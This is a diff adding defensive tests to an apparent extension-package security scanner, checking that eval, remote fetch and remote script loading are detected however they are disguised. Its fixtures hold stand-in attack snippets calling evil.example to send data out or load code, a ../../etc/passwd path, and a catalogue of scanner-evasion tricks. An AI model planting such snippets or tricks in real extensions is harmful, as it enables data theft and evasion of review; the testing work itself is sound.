@@ -581,3 +581,336 @@ def test_stored_defaults_backfills_a_sparse_stored_blob():
     assert sparse["uses_eval"] is False  # backfilled
     assert sparse["manifest_version"] == 2  # backfilled
     assert sparse["package_sha256"] == ""  # backfilled
+
+
+# --- #275: the code-behaviour scan must not be evadable by filename ------------
+
+
+def test_mjs_payload_is_scanned():
+    """The issue's headline case: a payload named `bg.mjs` used to score zero on
+    every code-behaviour and network signal — below an extension whose package
+    could not be downloaded at all, which gets the unknown-midpoint."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "bg.mjs": "eval(atob('x')); fetch('https://evil.example/collect');",
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_eval is True
+    assert result.uses_remote_code is True
+    assert "evil.example" in result.external_domains
+
+
+def test_cjs_payload_is_scanned():
+    """A VS Code extension's `main` is routinely `extension.cjs`."""
+    data = make_zip(
+        {
+            "extension/package.json": json.dumps(
+                {"name": "e", "version": "1", "contributes": {}, "main": "./out/extension.cjs"}
+            ),
+            "extension/out/extension.cjs": "eval('1');",
+        }
+    )
+    assert inspect_package(data).uses_eval is True
+
+
+def test_manifest_referenced_file_is_scanned_whatever_its_extension():
+    """Chrome loads whatever path the manifest names, so the manifest — not the
+    filename — is the authoritative list of what executes."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps(
+                {
+                    "manifest_version": 3,
+                    "name": "x",
+                    "version": "1",
+                    "background": {"service_worker": "core.dat"},
+                }
+            ),
+            "core.dat": "eval('payload'); fetch('https://evil.example/x');",
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_eval is True
+    assert "evil.example" in result.external_domains
+
+
+def test_manifest_referenced_content_script_is_scanned():
+    data = make_zip(
+        {
+            "manifest.json": json.dumps(
+                {
+                    "manifest_version": 3,
+                    "name": "x",
+                    "version": "1",
+                    "content_scripts": [{"matches": ["<all_urls>"], "js": ["/payload.bin"]}],
+                }
+            ),
+            "payload.bin": "new Function('x')();",
+        }
+    )
+    assert "new_function_usage" in _finding_codes(inspect_package(data))
+
+
+def test_manifest_path_cannot_escape_the_archive():
+    """A `..` segment is dropped rather than resolved — a manifest must not
+    reach outside its own package."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps(
+                {
+                    "manifest_version": 3,
+                    "name": "x",
+                    "version": "1",
+                    "background": {"service_worker": "../../etc/passwd"},
+                }
+            ),
+            "ok.js": "console.log(1);",
+        }
+    )
+    assert inspect_package(data).uses_eval is False  # no crash, nothing escaped
+
+
+def test_inline_script_in_background_page_is_scanned():
+    """An MV2 background page can carry its whole payload inline."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps(
+                {"manifest_version": 2, "name": "x", "version": "1", "background": {"page": "bg.html"}}
+            ),
+            "bg.html": "<html><body><script>eval('go'); fetch('https://evil.example/c');</script></body></html>",
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_eval is True
+    assert result.uses_remote_code is True
+    assert "evil.example" in result.external_domains
+
+
+def test_remote_script_include_in_packaged_page_is_flagged():
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
+            "popup.html": '<html><script src="https://evil.example/loader.js"></script></html>',
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_remote_code is True
+    assert "remote_script_include" in _finding_codes(result)
+    assert "evil.example" in result.external_domains
+
+
+def test_html_findings_report_the_line_in_the_page():
+    """Masking (rather than stripping) the markup keeps reported line numbers
+    pointing at real positions in the HTML file."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
+            "page.html": "<html>\n<body>\n<div>hi</div>\n<script>\neval('x');\n</script>\n</body>\n</html>",
+        }
+    )
+    finding = next(f for f in inspect_package(data).findings if f.code == "eval_usage")
+    assert finding.file == "page.html"
+    assert finding.line == 5
+
+
+def test_markup_only_html_does_not_trigger_js_heuristics():
+    """Guards the #151 false-positive class: a large minified page with no
+    inline script must not read as minified/obfuscated JavaScript."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "big.html": "<html><body>" + "<div class='a b c'>text</div>" * 400 + "</body></html>",
+        }
+    )
+    result = inspect_package(data)
+    assert result.has_minified_code is False
+    assert result.obfuscation_score == 0
+    assert _finding_codes(result) == set()
+
+
+@pytest.mark.parametrize(
+    "page",
+    [
+        # An HTML parser ends a script block on any of these; matching only the
+        # clean `</script>` spelling let the payload hide behind a sloppy end tag.
+        "<html><script>eval('x');</script foo></html>",
+        "<html><script>eval('x');</script\n></html>",
+        "<html><script>eval('x');</script/></html>",
+        # Unterminated at EOF — browsers execute it all the same.
+        "<html><body><script>eval('x');",
+    ],
+)
+def test_script_block_end_tag_variants_do_not_hide_the_payload(page):
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 2, "name": "x", "version": "1"}),
+            "bg.html": page,
+        }
+    )
+    assert inspect_package(data).uses_eval is True
+
+
+def test_script_inside_an_html_comment_is_not_treated_as_code():
+    """A commented-out script never executes, so flagging it would be a pure
+    false positive. A regex over the raw page could not tell the difference."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "c.html": "<html><!--<script>eval('x');fetch('https://evil.example/a');</script>--></html>",
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_eval is False
+    assert result.external_domains == []
+
+
+def test_script_ends_at_a_close_tag_inside_a_string_literal():
+    """Browsers end the block at the first `</script>` even inside a string, so
+    the trailing eval is markup, not code — matching browser semantics is the
+    point of parsing rather than pattern-matching."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "s.html": "<html><script>var s='</script>';eval('x');</script></html>",
+        }
+    )
+    assert inspect_package(data).uses_eval is False
+
+
+def test_markup_after_a_sloppy_end_tag_is_still_masked():
+    """The end-tag handling must not swing the other way and start feeding
+    markup to the JS heuristics."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "p.html": "<html><script>var a=1;</script foo>" + "<div class='a b c'>t</div>" * 400 + "</html>",
+        }
+    )
+    result = inspect_package(data)
+    assert result.has_minified_code is False
+    assert result.obfuscation_score == 0
+
+
+# --- #275 review: HTML script elements must be classified the way a browser does ---
+
+
+@pytest.mark.parametrize(
+    "src",
+    [
+        " https://evil.example/p.js",  # browsers strip leading ASCII whitespace
+        "https://evil.example/p.js ",
+        "\thttps://evil.example/p.js",
+        "\nhttps://evil.example/p.js\n",
+    ],
+)
+def test_remote_script_src_is_normalised_before_the_scheme_check(src):
+    """A raw-attribute comparison let `src=" https://…"` load remote code while
+    producing no finding, no external domain and no callout at all."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "p.html": f'<html><script src="{src}"></script></html>',
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_remote_code is True
+    assert "remote_script_include" in _finding_codes(result)
+    assert "evil.example" in result.external_domains
+
+
+@pytest.mark.parametrize(
+    "script_type",
+    ["application/json", "importmap", "speculationrules", "text/x-handlebars-template"],
+)
+def test_data_blocks_are_not_scanned_as_javascript(script_type):
+    """A non-JavaScript type is a data block: the body never executes, so scoring
+    it would let inert JSON containing the text `eval(...)` add code-behaviour
+    points."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "p.html": f'<html><script type="{script_type}">{{"x":"eval(payload); fetch(\'https://evil.example/a\')"}}</script></html>',
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_eval is False
+    assert result.uses_remote_code is False
+    assert result.external_domains == []
+    assert _finding_codes(result) == set()
+
+
+def test_src_on_a_data_block_is_not_flagged():
+    """Browsers never fetch the src of a non-executable script type, so a critical
+    finding there is a pure false positive."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "p.html": '<html><script type="application/json" src="https://cdn.example/data.json"></script></html>',
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_remote_code is False
+    assert "remote_script_include" not in _finding_codes(result)
+
+
+@pytest.mark.parametrize(
+    "script_type",
+    [
+        "",  # <script type="">
+        "text/javascript",
+        "TEXT/JAVASCRIPT",  # matching is case-insensitive
+        "text/javascript; charset=utf-8",  # parameters ignored: match on the essence
+        "module",
+        "application/ecmascript",
+        "text/jscript",  # legacy spellings are still executed
+    ],
+)
+def test_executable_script_types_are_still_scanned(script_type):
+    """The type check must not swing the other way and let a payload hide behind
+    a legacy or parameterised JavaScript MIME type."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "p.html": f'<html><script type="{script_type}">eval("x");</script></html>',
+        }
+    )
+    assert inspect_package(data).uses_eval is True
+
+
+def test_duplicate_type_attribute_uses_the_browsers_first_value():
+    """HTML keeps the FIRST of a repeated attribute; BeautifulSoup defaults to the
+    last. `type="text/javascript" type="application/json"` executes in a browser,
+    so reading the trailing type would skip a live payload."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "p.html": '<html><script type="text/javascript" type="application/json">eval("x");</script></html>',
+        }
+    )
+    assert inspect_package(data).uses_eval is True
+
+
+def test_duplicate_src_attribute_uses_the_browsers_first_value():
+    """Same rule for src: the browser loads the first, so that is the URL to report."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "p.html": '<html><script src="https://evil.example/a.js" src="local.js"></script></html>',
+        }
+    )
+    result = inspect_package(data)
+    assert result.uses_remote_code is True
+    assert "evil.example" in result.external_domains
+
+
+def test_duplicate_type_does_not_create_a_false_positive_either():
+    """The inverse: a data block whose *first* type is inert stays inert."""
+    data = make_zip(
+        {
+            "manifest.json": json.dumps({"manifest_version": 3, "name": "x", "version": "1"}),
+            "p.html": '<html><script type="application/json" type="text/javascript">eval("x");</script></html>',
+        }
+    )
+    assert inspect_package(data).uses_eval is False
